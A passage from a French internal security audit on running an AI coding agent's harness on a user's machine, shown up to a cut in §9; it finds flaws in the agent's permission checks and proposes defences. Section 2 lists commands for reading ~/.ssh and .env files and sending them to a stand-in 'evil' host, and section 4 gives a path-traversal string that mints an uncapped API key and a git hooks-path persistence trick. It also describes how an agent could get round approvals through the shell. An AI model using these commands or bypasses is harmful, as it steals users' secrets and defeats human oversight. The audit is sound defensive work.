# MIN-293 — Faire tourner le harness sur la machine de l'utilisateur

**Audit d'exploration. Aucun code écrit.** 30 agents, dont un qui a exercé le vrai
binaire `opencode-ai@1.18.16` avec 20 sondes (config de minddy rejouée, faux
fournisseur qui scripte les appels de tool — aucun modèle dépensé).

Ce document remplace, sur les points qu'il traite, ce que
[docs/desktop-electron.md](../desktop-electron.md) §4 tenait pour acquis.

---

## 0. Le verdict, en cinq lignes

Le portage lui-même est petit : le harness est déjà un bundle Node autonome, sa
couche dépôt tourne déjà sur un disque local ([vm/local-host.ts](../../lib/server/agent/vm/local-host.ts)),
et le Node d'Electron 43 est exactement la cible `node24` du bundle — **mesuré :
`.agent-vm/main.js` s'exécute tel quel sous `ELECTRON_RUN_AS_NODE=1` et meurt sur
le premier chemin en dur, `/vercel/sandbox/harness/job.json`, et rien avant.**

**Ce qui est difficile n'est pas le portage : c'est l'exigence d'accès à
l'ordinateur.** Et la mesure est sévère — le mécanisme sur lequel tout le monde
comptait pour la porter, `external_directory`, ne couvre **pas** ce qu'il a l'air
de couvrir. Le détail est au §2 ; c'est le résultat le plus important de l'audit.

---

## 1. Ce que la mesure a tranché

Dix-huit inconnues que quatre documents laissaient ouvertes sont levées. **Presque
toutes dans le sens défavorable.**

| # | Mesuré sur `opencode-ai@1.18.16` | Conséquence |
| --- | --- | --- |
| 1 | `external_directory: "deny"` **court-circuite avant toute publication** | Le `case "external_directory"` de [opencode-permissions.ts:177-181](../../lib/server/agent/vm/opencode-permissions.ts#L177-L181) **est du code mort**, pas un « second rideau ». Le commentaire qui le décrit ainsi est faux. |
| 2 | Un `always` humain **écrase un `deny` de config** | Les règles approuvées en session sont concaténées **après** celles de la config, et c'est le **dernier match qui gagne**. Un « oui » sur `~/*` lève un `deny` posé sur `~/.ssh/*`. |
| 3 | `deny` **n'est pas prioritaire** : l'**ordre de déclaration** décide | Deux configs identiques au seul ordre des clés près donnent DENIED et ALLOWED sur la même lecture. |
| 4 | **Aucun timeout côté opencode** | Relevé toutes les 12 s pendant **303 s** : demande pendante, tool `running`, session `busy`, sans dénouement. Le seul plafond est le nôtre (12 h). Corollaire : `session.idle` n'arrive jamais, donc tout ce que le superviseur fait au `session.idle` est suspendu aussi. |
| 5 | Tuer opencode pendant une attente est **irréversible** | Après redémarrage : la session est retrouvée, `GET /permission` rend `[]`, et la part de tool reste figée à `{"status":"running"}` **pour toujours**. Rien ne la ressuscite. |
| 6 | La **cascade de refus** est réelle | Un round à trois `bash` → **trois demandes pendantes simultanées**. Un `reject` sur la première rejette les deux autres. |
| 7 | `always` sur `edit` porte le motif **`*`**, pas un chemin | Un seul clic « toujours » rend **toutes** les éditions suivantes muettes. Idem `task` et `webfetch`. `bash`, lui, est par verbe (`echo *`). |
| 8 | Le `always` est **en mémoire**, fuit entre sessions, meurt au redémarrage | Le harness relançant opencode à chaque tour, **un « toujours » vaut un tour**. Le magasin persistant `/api/permission/saved` existe mais les tools de 1.18.16 n'y écrivent rien. |
| 9 | `*` **traverse les `/`**, et `~` est expansé | Le grain d'un « oui » est le **sous-arbre**. Un « toujours » sur un fichier à la racine du home donnerait `~/*`. |
| 10 | `POST /question/:id/reply` **fonctionne, bloque sans timeout, et ne termine pas le tour** | « `ask_user` est terminal » est un **choix de minddy** ([supervisor.ts:1033-1049](../../lib/server/agent/vm/supervisor.ts#L1033-L1049)), motivé par le coût d'une microVM ouverte — motif qui **tombe** sur la machine de l'utilisateur. |
| 11 | `abort` **ne dénoue pas** les demandes pendantes | Elles fuient et restent répondables après la fin du round. |
| 12 | Un `deny` nu **retire le tool du catalogue** | `websearch` et `todowrite` ne sont pas « refusés » : ils n'existent pas. Ceci **corrige** la mesure n°4 consignée en tête de [opencode-config.ts:56-60](../../lib/server/agent/vm/opencode-config.ts#L56-L60). |
| 13 | Un ruleset **par session** en `deny` **ampute le jeu de tools** | Deux propositions comptaient dessus comme d'une ACL propre. Ce n'en est pas une. Le cas `action: "allow"` **reste à mesurer**. |
| 14 | Le tool `bash` porte un paramètre **`workdir`**, et un `workdir` hors dépôt publie bien `external_directory` avec `metadata.directories` | **Le seul endroit où le shell déclare une intention de chemin de façon fiable.** Cité par aucune proposition. |
| 15 | `cd` publie `external_directory` et **jamais** `bash` ; `cd .` et `popd` ne publient **rien** | Ces commandes ne passent **jamais** devant `checkCommand`. La mesure n°1 de [opencode-permissions.ts:24-27](../../lib/server/agent/vm/opencode-permissions.ts#L24-L27) (« demande pour TOUTE commande ») est vraie de `echo hi`, fausse de `cd`. |
| 16 | Une demande venue d'un **sous-agent** porte le sessionID de l'enfant ; la cascade est par session | Aucune proposition ne traite le cas. |
| 17 | Il n'y a **pas de tool `list`** | `list: "allow"` ([opencode-config.ts:331](../../lib/server/agent/vm/opencode-config.ts#L331)) est un no-op. |
| 18 | `OPENCODE_SHELL_CWD` **n'existe pas dans le binaire** (0 occurrence) | [opencode-config.ts:645](../../lib/server/agent/vm/opencode-config.ts#L645) est du code mort, et tout raisonnement sur un shell persistant entre rounds est sans fondement. |

> **FAIT (MIN-362, 2026-08-15) : ce tableau n'est plus la source.** Les mesures
> vivent en sondes pérennes, et c'est là qu'il faut les lire et les relancer —
> [opencode-permissions.probe.test.ts](../../lib/server/agent/vm/opencode-permissions.probe.test.ts)
> (`MDY_OPENCODE_PERMS_PROBE=1`, aucun modèle dépensé),
> [opencode-wait.probe.test.ts](../../lib/server/agent/vm/opencode-wait.probe.test.ts)
> (`MDY_OPENCODE_WAIT_PROBE=1`) et, pour git,
> [worktree-hooks.git.test.ts](../../lib/server/agent/worktree-hooks.git.test.ts),
> qui tourne avec `npm test`. Elles **corrigent** deux lignes de ce tableau, et
> il faut lire la correction avant de s'appuyer dessus :
>
> - **ligne 9** — `~` n'est expansé et `*` ne traverse les `/` que sur
>   `external_directory`. Les motifs d'`edit` sont **relatifs au dépôt**, sans
>   `~` : un `edit: {"~/.ssh/*": "deny"}` ne refuse rien et ne demande rien ;
> - **ligne 12** — le `deny` nu retire le tool de ce qui est **offert au
>   modèle**, mais `/experimental/tool` continue de le lister.
>
> Le détail, avec ce qu'elles ont ajouté au §9, est au
> [§2.32 du dossier opencode](../harness-opencode.md).

---

## 2. Le mur de papier

**C'est le résultat central de l'audit.** L'exigence « l'agent doit atteindre des
fichiers hors de son dossier, avec des demandes d'approbation » se traduisait
naturellement par : ouvrir `external_directory`, escalader à l'humain. Mesuré
commande par commande, **ce mécanisme ne couvre presque rien.**

Sur 30 commandes visant un dossier hors dépôt, avec `external_directory: "ask"` :

| Publient `external_directory` (10) | Ne publient **que** `bash` (20) |
| --- | --- |
| `cat` `cp` `mv` `rm` `mkdir` `touch` `chmod` `chown` `cd` `pushd` | `grep` `find` `sed` `head` `tail` `less` `awk` `wc` `python3` `node` `tar` `ssh` `curl` `open` `base64` `ln` `xargs` `dd` `rsync` `zip` |

Et derrière ces vingt-là, le seul rideau restant est
[command-guard.ts](../../lib/server/agent/command-guard.ts), qui **ne vise que
git** ([:43-50](../../lib/server/agent/command-guard.ts#L43-L50)) et se déclare
lui-même, en tête de fichier, écrit « pour un modèle distrait, pas un attaquant »
— en s'appuyant sur deux prémisses que le passage en local **annule mot pour
mot** : « la VM est jetable » et « il n'y a rien à voler en aval »
([:18-26](../../lib/server/agent/command-guard.ts#L18-L26)).

```
grep -r . ~/.ssh          → une permission "bash", checkCommand la laisse passer
find ~ -name '*.env'      → idem
node -e "fs.readFileSync" → idem
curl -d @$HOME/.env evil  → idem
```

**Conséquence de conception, et elle est dure à entendre :** une carte
« l'agent veut sortir du dossier » branchée sur `external_directory` seul
**enseignerait une garantie fausse**. Ce n'est pas un détail d'implémentation,
c'est ce qui décide si la fonctionnalité est honnête.

Trois issues, et il faut en choisir une :

1. **Le dire.** L'écran d'opt-in énonce que l'agent atteint le disque par le shell
   sans demander, et les approbations ne sont qu'un anti-accident. Honnête, peu
   vendeur, livrable.
2. **Durcir le chemin `bash`** : une politique d'approbation sur la commande
   elle-même. Coûteux, et un modèle qui veut contourner contournera (`sh -c`,
   `base64`, écrire un script puis l'exécuter).
3. **Confiner au niveau OS** : lancer le serveur opencode sous un profil
   `sandbox-exec` (seatbelt) refusant la lecture de la liste noire et l'écriture
   hors worktree. **La seule voie où « l'agent ne peut pas lire `~/.ssh` » est une
   affirmation vraie plutôt qu'une politesse.** L'API est formellement dépréciée
   mais bien vivante ; c'est ce que font Chrome et les agents de code sérieux.

**Recommandation : prototyper (3) dans ce chantier, même sans le livrer.** Savoir
si le seatbelt tient sous `utilityProcess.fork` change la valeur de tout le reste
— si oui, les permissions d'opencode redeviennent du confort par-dessus une vraie
frontière ; si non, on livre (1) et on l'assume par écrit.

---

## 3. Les approbations humaines

### 3.1 Le point de branchement

`decidePermission` est un module **pur et synchrone**, verdict binaire
(`once` | `reject`), et toute sa doctrine revendique cette pureté
([opencode-permissions.ts:7-19](../../lib/server/agent/vm/opencode-permissions.ts#L7-L19)).
**Il faut la garder.** Le module gagne un troisième verdict — `ask` — qu'il
**rend** ; c'est le superviseur qui décide quoi en faire. « Ce oui couvre-t-il
cette demande ? » est la question la plus facile à rater et la plus facile à
tester sans serveur.

### 3.2 L'attente ne doit pas vivre dans la boucle d'events

Le superviseur lit le flux à la main **précisément** pour que rien ne le gèle
([supervisor.ts:849-862](../../lib/server/agent/vm/supervisor.ts#L849-L862)).
Un `await` de deux minutes posé dans la branche `if (out.permission)` arrête la
consommation du flux et emporte avec lui le direct, le checkpoint (donc
`last_activity_at`, donc le chien de garde), le Stop et la deadline.

**La forme qui tient :** le superviseur *enregistre* la demande, la poste, et
**repart lire le flux**. Le tool est suspendu par opencode ; notre boucle ne l'est
jamais. La réponse redescend par une surface du plan de contrôle drainée au
battement — accéléré à 1 s tant qu'une demande pend, sans quoi chaque clic coûte
jusqu'à cinq secondes de silence et l'utilisateur cliquera deux fois.

### 3.3 Le « defer » n'est pas réalisable

L'option séduisante — couper le tour, répondre au tour suivant, comme `ask_user`
le fait déjà — **est morte à la mesure n°5** : le `callId` ne survit pas à la mort
du process, et rien ne le ressuscite. On ne peut pas rejouer le même appel ; il
faudrait convertir l'approbation en règle et *espérer* que le modèle refasse le
même geste.

**En revanche, la mesure n°10 ouvre une porte que personne n'avait vue :**
`POST /question/:id/reply` bloque sans timeout et **rend la main au modèle sans
terminer le tour**. Le canal « l'humain répond dans le tour » existe **déjà** côté
binaire, pour les questions. C'est probablement le meilleur véhicule pour une
approbation **rare et lisible** (« l'agent veut lire `~/Documents` ») — bien plus
que d'inventer un troisième verdict pour un `external_directory` dont on vient de
mesurer qu'il ne couvre que dix commandes.

### 3.4 Ce qu'il faut décider, et que rien ne tranche pour nous

- **La fatigue.** `bash: "ask"` demande pour *toute* commande. Sans politique de
  tri, un tour ordinaire produit des dizaines à des centaines de demandes — c'est
  l'inverse du produit. Au troisième run, il cliquera sans lire.
- **La durée d'un « oui ».** Mesure n°8 : le protocole ne persiste rien. Si on
  veut qu'un oui dépasse le tour, **c'est à nous de le stocker** et de le rejouer
  en règles au tour suivant. Et mesure n°7 : ne **pas** offrir « toujours » sur
  `edit` — le motif est `*`, et la permission `edit` est la seule source de
  « fichiers changés » du direct ([supervisor.ts:1004](../../lib/server/agent/vm/supervisor.ts#L1004)).
- **Le lot.** Mesure n°6 : plusieurs demandes pendantes est le cas ordinaire, et
  un refus les refuse toutes. La carte doit dire « l'agent demande N choses »,
  pas offrir un tri. Et il faut traduire `permission.replied` (aujourd'hui ignoré)
  pour rendre inertes les cartes annulées par cascade, sinon l'UI affiche des
  boutons qui répondront **404**.
- **Le cas fondamental de minddy.** Un run part d'un ticket, souvent quand
  personne ne regarde. Un TTL de 10 min avec un utilisateur absent produit un
  refus par défaut — que le modèle contournera par le shell (§2). Claude Code a
  un nom pour ce mode : `dontAsk`, « the session never waits for input ». C'est
  probablement le bon défaut pour un run non-interactif.
- **Les sous-agents** (mesure n°16) : de qui vient la carte, dans quelle bande du
  fil, et le crédit `running + pending` du plafond est calculé **à l'instant du
  verdict** — le décaler de plusieurs minutes change ce que le plafond mesure.

### 3.5 Le transport n'existe pas

Il n'y a **aucun canal descendant adressé** aujourd'hui. Le seul qui existe — le
steering — est un sondage à 5 s dont la sémantique est « coupe le round et
repose », sans corrélation (ni type, ni destinataire, ni id de demande). Le
réutiliser **détruirait le round où le tool est suspendu**, coûterait un contrôle
de quota par « oui », et — pire — re-queue le run + kick le drain, c'est-à-dire
**relancerait un tour dans le cloud** alors que le tour attend sur le Mac.

Deux pièges du dépôt, déjà payés ailleurs :

- La diffusion d'un event depuis le plan de contrôle est une promesse **détachée**
  (`void broadcast(…)`, [live.ts:105-110](../../lib/server/agent/live.ts#L105-L110)),
  là où le voisin `/stream` utilise `afterOrNow` pour exactement cette raison. La
  montée « instantanée » d'une demande n'est pas garantie.
- Sans migration du CHECK de `agent_run_events.type`, la demande disparaît **en
  silence** (`appendEvent` avale l'échec, [runs.ts:1358-1378](../../lib/server/agent/runs.ts#L1358-L1378)).
  Le piège a déjà été payé deux fois — MIN-86, `quota_exhausted`.

Et personne n'écoute au repos : `useAgentRunLive` ne s'abonne que si le run
travaille **et** que la conversation est montée. **La notification est le seul
chemin qui rejoint un humain absent** — or l'app de bureau émet ses bannières
depuis le *renderer* en API web, qui n'a **ni boutons ni champ de réponse**.
`electron.Notification` (qui, lui, a `actions` et `hasReply`) n'est instancié nulle
part.

---

## 4. Les trois verrous

### Verrou 1 — prouver quel run on est

**Retenu : un jeton HS256 auto-porteur `{rid, gen, exp}`**, 15 min glissantes,
patron exact de [sso-jwt.ts](../../lib/feedback/sso-jwt.ts) (HS256 seul,
`timingSafeEqual`, plafond de TTL imposé à la vérification).

**Vérifié, et ça tranche l'inconnue du cadrage :** `defineSandboxProxy(handler,
invalidRequestHandler?)` accepte un **second argument**, appelé avec la requête
**originale, corps non consommé**, quand les en-têtes `vercel-forwarded-*`
manquent. La voie locale n'est donc **ni une route jumelle ni un fork** : c'est un
`catch` sur la porte existante. Le 413, le parsing, la dérivation de `surface` et
l'appel à `handleControlPlaneRequest` restent écrits **une seule fois**.

Pourquoi pas le jeton opaque haché : `POST /stream` est servi **sans lire la ligne
du run**, délibérément (~4 appels/s, ~29 000 par tour de deux heures — le
raisonnement est écrit en clair, [control-plane.ts:291-313](../../lib/server/agent/control-plane.ts#L291-L313)).
Un hash impose un lookup par requête, c'est-à-dire exactement la charge que ce
court-circuit existe pour supprimer. La **révocation** se paie là où la ligne est
déjà lue : un entier `agent_runs.local_exec_gen` comparé au claim `gen`.

> **Correction au cadrage, et elle est tranchante.** Un run local n'a pas de
> `loop_command_id`, donc `reapDeadVmRuns` ne prend pas la borne de 2 h mais la
> branche « jamais lancé » de **15 minutes** ([drain.ts:255-262](../../lib/server/agent/drain.ts#L255-L262)).
> **Le chien de garde tue tout run local de plus d'un quart d'heure**, stampe
> `completed`, publie « l'agent s'est arrêté » et facture du compute.

**Le dégât d'un jeton volé, énuméré et non minimisé :** `/repo-auth` rend un token
d'installation `repo-write` **à la demande, renouvelable indéfiniment**
([control-plane.ts:540-573](../../lib/server/agent/control-plane.ts#L540-L573)) ;
`/tool/*` sert `create_issue`, `set_scratchpad` (réécriture intégrale du carnet
privé) et `web_search`, **au nom de `run.created_by`** ; `GET /messages`
**consomme** la file de steering. Seule `/rest` exige que le run soit actif.

→ Réduire le **pouvoir** du jeton plutôt que prétendre le protéger : ne pas servir
`/repo-auth` sur le chemin local (le renouvellement passe par l'app, qui a la
session utilisateur), exiger `status = 'running'` sur **toutes** les surfaces
locales, retirer `set_scratchpad` du chemin local.

### Verrou 2 — la clé du modèle

**Retenu : la clé descend d'un cran seulement** — jusqu'au proxy LLM du harness,
gardée en mémoire, **jamais** dans `job.json` ni dans `OPENCODE_CONFIG_CONTENT`
(qui entre dans l'environnement du serveur opencode, donc lisible par `env`).
**Pas de mint = pas de run local**, au lieu de la dégradation silencieuse
d'aujourd'hui vers `OPENROUTER_API_KEY`, la clé plateforme **sans plafond**,
partagée avec Numo, la transcription et les embeddings.

Le relais serveur est le **repli**, pas la v1 : il ne réduit pas le dégât réel (ce
qu'un modèle hostile peut faire avec la clé, il peut le faire à travers le relais)
et fait passer 100 % des tokens d'un tour de 12 h par une fonction plafonnée à
300 s.

> **Faille dans la garde proposée, mesurée.**
> `'/../v1/keys#/chat/completions'` passe `isCompletion`
> ([llm-proxy.ts:362](../../lib/server/agent/vm/llm-proxy.ts#L362), test de
> **suffixe** sur une request-target brute) et `fetch` normalise vers
> `/api/v1/keys`. Le modèle **s'émet une clé sans plafond** et le verrou 2 tombe
> entièrement. → `new URL(target + path)`, égalité **stricte** sur `pathname`,
> `method === "POST"`, rejet de `#`, `..`, `//`. Une route servie, pas un relais.

**BYOK en local n'a littéralement aucun plafond** : pas de clé plafonnable, pas de
`budgetUsd`, et le compute de microVM — dernier garde-fou dans le cloud — vaut
zéro. → **BYOK reste dans le cloud en v1.**

### Verrou 3 — le dépôt

**Retenu : le `git worktree` du cadrage pour tout ce qui s'écrit ; la lecture
s'ouvre au reste de la machine.** Mais le cadrage se trompe sur son coût et rate
son meilleur argument.

**Mesuré sur ce dépôt** (838 commits, 2 333 fichiers, `.git` = 187 Mo) :

| Geste | Temps | Disque |
| --- | --- | --- |
| `git worktree add` | **0,54 s** | 54 Mo |
| `pnpm install --frozen-lockfile` dans le worktree neuf | **9,0 s** | **~0 octet** (hardlinks depuis le store) |
| `cp -Rc node_modules` (clonefile APFS) | 25,4 s | **~0 octet** |

→ **« Le premier tour paie une installation » ([desktop-electron.md:356-360](../desktop-electron.md))
est faux sur macOS.**

Et l'argument que le cadrage n'a pas vu : dans un worktree, `.git` est un
**fichier**, donc `mkdir .GIT/hooks` échoue (mesuré : « Not a directory »), alors
que dans un clone frais sur APFS — insensible à la casse — `.GIT/hooks/post-commit`
**est** `.git/hooks/post-commit`. **Le worktree ferme un trou que le clone ouvre.**

**Pourquoi pas la copie de travail de l'humain, malgré « comme Claude Code » :**
`commitAndPush` fait `git status --porcelain` → `git add -A` → `git commit` →
`git push` ([repo-host.ts:330-365](../../lib/server/agent/repo-host.ts#L330-L365))
et `cloneRepo` fait `git checkout -b` ([:169](../../lib/server/agent/repo-host.ts#L169)).
Dans ta copie, ça emporte ton WIP dans une pull request et te change de branche
sous les doigts. **Claude Code ne fait ni l'un ni l'autre : son produit est un
diff que tu relis dans ton éditeur.** Ce n'est pas le même produit — et c'est ça
qu'il faut se dire avant de vouloir l'imiter.

**Ce que le worktree n'isole pas**, et qui annule son argument central :
`git -C ~/Projets/minddy checkout autre-branche` et `git -C … stash` sont
**autorisés** — `gitInvocation` saute les options globales `-C`/`--git-dir`/
`--work-tree` ([command-guard.ts:153-174](../../lib/server/agent/command-guard.ts#L153-L174))
et ne refuse que six sous-commandes. **Le worktree isole le harness ; il n'isole
pas le modèle.** C'est une frontière de *produit* (ce qui part en PR), pas de
sécurité.

Et `git config` n'est gardé par personne : `git -C <dépôt de l'humain> config
core.hooksPath <dossier de l'agent>` fait **exécuter du code de l'agent au
prochain `git commit` de l'humain**, dans son terminal, avec son trousseau
déverrouillé — une persistance que ni la révocation de clé ni la fermeture de
l'app n'atteignent.

---

## 5. L'hébergement sur le Mac

**Retenu : `utilityProcess.fork` depuis le main process**, avec le Node embarqué
(**mesuré : Electron 43.4.0 → Node 24.18.1**, exactement la cible du bundle).
Bundle **téléchargé par tour** depuis l'origine du canal actif — l'embarquer le
ferait entrer dans l'empreinte de republication et coûterait une notarisation à
chaque mouvement de `protocol.ts`.

**Découverte : un PULL avec bail**, pas le push du §4.5. La présence devient
**émergente** — une machine qui ne réclame plus n'est plus là — là où le push
demande un heartbeat, une course entre machines et une invalidation, pour le même
résultat. Et l'abonnement temps réel vit dans la **page**, pas dans l'app : il ne
sert à rien pour une coquille en arrière-plan.

**Le tour doit mourir avec l'app.** Un harness détaché survivant à ⌘Q garderait un
token GitHub `contents: write` et une clé LLM vivants sans plus aucune UI pour les
arrêter. Aujourd'hui `before-quit` détruit la fenêtre **sans rien demander** : il
faut écrire la question.

**Sept choses qui cassent, et qu'aucun document ne mentionnait :**

1. Le **chien de garde** tue tout run local > 15 min (cf. verrou 1).
2. `sandboxMs` **facture** à l'utilisateur des minutes de microVM que personne n'a
   payées — et le corriger « en demandant au harness de rendre 0 » confie à la
   machine potentiellement compromise le soin de ne pas se facturer. → **borne
   serveur**, marque « run local » posée au lancement et jamais relue du rapport.
3. Le **diff en direct disparaît** : la route lit la microVM par RPC et retombe en
   silence sur la forge, qui ne connaît que ce qui est poussé.
4. Le **serveur opencode survit** à la mort du harness (`spawn` ni détaché ni
   suivi) : 143 Mo en mémoire, port 4096 tenu, **et le tour suivant échoue** sur
   un `listen` refusé.
5. Les **ports fixes** 4096 / 4097, sur une machine de développeur.
6. Les **jobs de fond** du modèle sont lancés en `setsid` **explicitement pour
   survivre au shell** ; `stopAll` ne tourne jamais sur un ⌘Q. Le `npm run dev`
   que le modèle a lancé reste vivant, port 3000 pris, **sans registre nulle part
   pour le retrouver**.
7. **Deux runs sur une machine** ne se réduisent pas à une collision de ports :
   `VM_JOB_PATH`, `OPENCODE_DB_PATH`, `OPENCODE_ANCHOR_FILE`, les XDG et
   `TOOL_OUTPUT_DIR` sont des constantes **globales**. Le layout doit être un
   objet **par run**, pas une variable d'environnement posée une fois.

**TCC n'est traité nulle part.** Le bundle ne porte aucune `NS…FolderUsageDescription` :
dès que l'agent lit `~/Documents`, `~/Desktop`, `~/Downloads` ou iCloud Drive,
macOS refuse et **la fenêtre de demande ne s'ouvre même pas**. Le refus est muet —
exactement le bug du micro déjà rencontré. Et l'entitlement
`disable-library-validation`, requis pour lancer un `opencode` que nous ne signons
pas, **combiné à `allow-dyld-environment-variables` déjà présent**, transforme
l'app en véhicule d'héritage TCC.

---

## 6. Ce qui remonte — le point non réparable

Toutes les propositions raisonnent sur ce qui **descend**. Personne ne regarde ce
qui **remonte**.

`agent_run_journal` porte la **sortie complète de chaque tool** — une lecture de
260 lignes y pèse 22 Ko, republiée deux à trois fois, écrite par lots de 1,5 Mo,
**conservée 30 jours** et **rejouée devant le modèle** au tour suivant. En
parallèle `agent_run_events` est persisté 30 jours et **lu par tout membre du
projet**.

Aujourd'hui c'est le contenu d'un clone jetable d'un dépôt que le projet possède
déjà. Avec l'accès à l'ordinateur, c'est le contenu de fichiers personnels, des
chemins `/Users/<prénom nom>/…`, du code d'autres clients et les `.env` voisins —
**qui partent dans la base de production de minddy**, et pour les events, sous les
yeux des collègues du projet. Et `redact.ts` ne connaît **qu'un** secret, le token
de forge, par substitution **littérale** (`split`/`join`), en ignorant toute
valeur de moins de 12 caractères.

**C'est le seul point du dossier qui n'est pas réparable après coup : ce qui est
monté est monté.** À trancher avant la première ligne de code :

- les sorties de tool portant un chemin hors du worktree ne sont ni journalisées
  ni publiées en event, seulement **comptées** ;
- le journal d'un run local est tronqué (ou chiffré au repos) ;
- l'écran d'opt-in dit **littéralement** « ce que l'agent lit sur ta machine est
  envoyé à minddy et conservé 30 jours », et la politique de confidentialité le
  reprend.

Corollaire : le chemin d'exfiltration le plus probable n'est pas `curl`, c'est
**`git add -A` → commit → push → pull request**, déclenché sans humain, à partir
d'un secret que la portée de lecture aura *légitimement* autorisé. Sur un dépôt
public, c'est publié. `delivery-gate.ts` est une porte de **qualité**, pas de
fuite. → **scan de secrets dur sur le diff avant push, qui refuse et le dit.**

---

## 7. Ce qui ne doit pas être livré sans son contre-pouvoir

| Ne pas livrer | Sans |
| --- | --- |
| L'ouverture d'`external_directory` | un durcissement du chemin `bash`, ou l'aveu écrit du §2 |
| Un grant durable | une liste dure appliquée **par nous** (mesure n°2), une durée, et l'exclusion des runs non-interactifs |
| La clé sur la machine | mint obligatoire, garde de chemin **normalisée**, refus BYOK |
| Le bundle téléchargé | vérification d'empreinte au fork — c'est le seul code non signé par Apple que l'app exécute, et il est **inscriptible par le modèle** sous le même UID |
| La recopie des `.env` | `core.excludesFile` **et** scan de secrets au push |
| `webfetch: "allow"` | il atteint désormais la loopback (donc le proxy LLM et le pont de tools, qui **n'authentifie rien**), le LAN, le NAS et le VPN d'entreprise |

**Un invariant serveur, pas un défaut :** un run dont l'ancrage est `pr`, ou
déclenché par un webhook de forge, une mention externe, une routine, une chaîne ou
le board public de feedback **ne part jamais sur une machine locale**. Le contexte
d'un tel run est du **texte d'attaquant potentiel** — le dépôt le reconnaît déjà
en refusant un token `repo-write` aux sessions de fork (« une injection de prompt
depuis le fork suffisait à le lire et à l'exfiltrer »). En local, la même
injection est **un shell sur la machine du développeur**. Le prédicat doit être la
source du déclenchement, pas `job.interactive` (qui vaut `!run.routine_id`, donc
**vrai** pour une relecture de PR déclenchée par webhook).

**Et un défaut à corriger dans le même geste :** `decidePermission` finit par
`default: return ALLOW`. Tout type de permission non déclaré — `lsp`, `skill`,
`doom_loop`, `plan_enter`, et tout ce qu'une montée de version ajoutera — passe.
Sur le chemin local, **`default` devient `reject`**.

---

## 8. Ce que l'audit rouvre dans le cadrage

### Le critère de bascule est mort

MIN-293 et [desktop-electron.md](../desktop-electron.md) §4 posent le même critère
d'acceptation : *« Le produit doit être identique ; seule la machine change. »*
**L'exigence d'accès à l'ordinateur l'annule.** Le run local aura des cartes
d'approbation, un périmètre de lecture, **plus de diff en direct**, un type-check
qui peut se taire (si `node_modules` manque, `detectTypeChecker` rend `null` et
**la porte de livraison se tait**), une machine qui chauffe et un disque qui
gonfle. → Réécrire la description du ticket et amender §4, sinon le cadrage
devient un piège pour le prochain qui l'ouvre.

> **FAIT.** La description de MIN-293 a été réécrite le 2026-08-14 (elle nomme
> désormais la perte du diff comme « la perte produit assumée du chantier »), et
> le §4 de [desktop-electron.md](../desktop-electron.md) porte depuis MIN-363 le
> critère qui remplace celui-là, avec ses quatre écarts en tableau.

### Le drapeau de mode d'exécution existe déjà

L'audit a répété qu'« aucun champ ne distingue un run local d'un run cloud ».
C'est faux : `agent_runs.loop_in_vm` et `agent_runs.agent_engine` sont **déjà**
des modes d'exécution **figés au lancement**, dérivés d'une liste de projets dans
`app_config` — c'est-à-dire exactement l'opt-in par projet que §4.4 réclame, déjà
rôdé. Et ils portent une **doctrine écrite** : *« une conversation ne change
JAMAIS de moteur en cours de vie »*, parce que *« chaque moteur relit SA mémoire
dans le checkpoint »*.

**Or le repli cloud du §4.5 viole ça frontalement** (tour 1 local, tour 2 en
microVM, journal opencode rejoué, session dont l'identité de projet est le chemin
du dépôt). → Soit `local` rejoint ces drapeaux et **le repli n'existe qu'avant le
premier tour** — ce qui simplifie énormément le dossier —, soit on documente
pourquoi la bascule à chaud est sûre ici alors qu'elle était refusée là.

### Le chantier atterrit là où la suite de tests ne va pas

`vitest.config.ts` : `include: ["lib/**/*.test.ts"]`. **Ni `app/api/**` ni
`desktop/src/**`** ne sont exercés — or le verrou 1 tient dans *un* fichier de
`app/api/`, et le lanceur vit dans `desktop/src/`. Le dépôt a pourtant deux
réponses déjà écrites : les **tests structurels** qui lisent la source
(`engine-wiring.test.ts` en explique la doctrine) et les **sondes pérennes**
`*.probe.test.ts`. → Écrire la matrice de test **avant** les lots, et y ajouter
`lib/i18n-contract.test.ts` : l'écran d'opt-in et les cartes d'approbation sont des
chaînes à double catalogue.

> **FAIT (MIN-362) : la matrice est exécutable.**
> [local-surface-coverage.test.ts](../../lib/server/agent/local-surface-coverage.test.ts)
> exige qu'une surface nommée hors de `lib/**` soit atteinte par un test de
> `lib/`, tient l'inventaire de `desktop/src/` — un fichier de plus doit dire où
> vivent ses décisions — et impose le patron `<module>.ts` / `<module>.test.ts`
> dans `lib/desktop/`. C'est là que le lanceur devra s'inscrire : sa décision
> descend dans `lib/desktop/`, la coquille ne garde que le `fork`.

### L'ordre de bataille, et la frontière avec MIN-294

MIN-293 (xl, plan `null`, zéro sous-issue) **bloque** MIN-294. Mais sans MIN-294,
aucun run n'atteint jamais la machine — et `kickAgentDrain` fait partir le cloud
dans la même invocation que le lancement, donc **le cloud gagne toujours**. *Un
ticket xl dont on ne peut rien vérifier avant que le suivant soit fait ne se livre
pas.* Découpage proposé, chaque lot vérifiable seul :

1. **Layout par run paramétré** — `REPO_DIR` & consorts sortent des constantes
   (~21 fichiers, ~80 cas de test à réécrire). **Tout le reste est bloqué
   derrière**, y compris les approbations : aujourd'hui `absoluteInRepo` lèverait
   sur chaque `metadata.filepath` réel et refuserait **100 %** des écritures.
2. **Deuxième voie d'admission + jeton**, avec un déclencheur de dev assumé qui
   force un run local sans MIN-294.
3. **Clé mintée et refus explicite.**
4. **Worktree et identité git.**
5. **Permissions et périmètre.**

Et corriger l'attribution : la présence, le claim et le repli appartiennent à
**MIN-294**, pas à 293.

---

## 9. Ce qu'il reste à mesurer avant de s'engager

Quatre de ces sept points ont été mesurés depuis (MIN-362, 2026-08-15) et sont
devenus des sondes ; les trois qui restent sont ceux qui portent encore un risque.

- ✅ `action: "allow"` en **ruleset de session** : c'est une **vraie ACL** — il
  lève l'`ask` de la config **sans** amputer le jeu de tools, là où le `deny` de
  session l'ampute. La seule autorisation par session qui ne coûte pas un tool.
- ✅ Le **système de permissions V2** : rien n'y passe. Ni
  `/api/session/:id/permission`, ni `/api/permission/request`, ni
  `/api/permission/saved` ne voient quoi que ce soit, même après un « toujours ».
  La seule persistance native offerte est **inutilisable en 1.18.16**.
- ✅ Une attente longue avec un **vrai fournisseur** : elle tient. 120 s de
  demande pendante sur un round Haiku passé par le proxy, et le tour repart quand
  on répond (`MDY_OPENCODE_WAIT_LIVE=1`).
- ✅ Qu'un `core.hooksPath` posé sur le dépôt principal s'applique **depuis un
  worktree** : **oui**. Le `config` est partagé par tous les worktrees, donc un
  `git commit` lancé là exécute le `pre-commit` de l'utilisateur. Notre fin de
